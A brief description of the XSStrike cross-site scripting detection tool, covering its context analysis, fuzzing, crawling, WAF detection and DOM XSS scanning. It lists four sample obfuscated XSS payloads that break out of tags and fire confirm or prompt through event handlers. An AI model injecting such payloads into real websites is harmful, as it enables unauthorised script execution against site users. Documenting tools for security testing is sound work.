# xss | [Advanced XSS Detection Suite](https://github.com/oneplus-x/XSStrike.git)
Instead of injecting payloads and checking it works like all the other tools do, XSStrike analyses the response with multiple parsers and then crafts payloads that are guaranteed to work by context analysis integrated with a fuzzing engine. Here are some examples of the payloads generated by XSStrike:
~~~
}]};(confirm)()//\
<A%0aONMouseOvER%0d=%0d[8].find(confirm)>z
</tiTlE/><a%0donpOintErentER%0d=%0d(prompt)``>z
</SCRiPT/><DETAILs/+/onpoINTERenTEr%0a=%0aa=prompt,a()//
~~~
Apart from that, XSStrike has crawling, fuzzing, parameter discovery, WAF detection capabilities as well. It also scans for DOM XSS vulnerabilities.
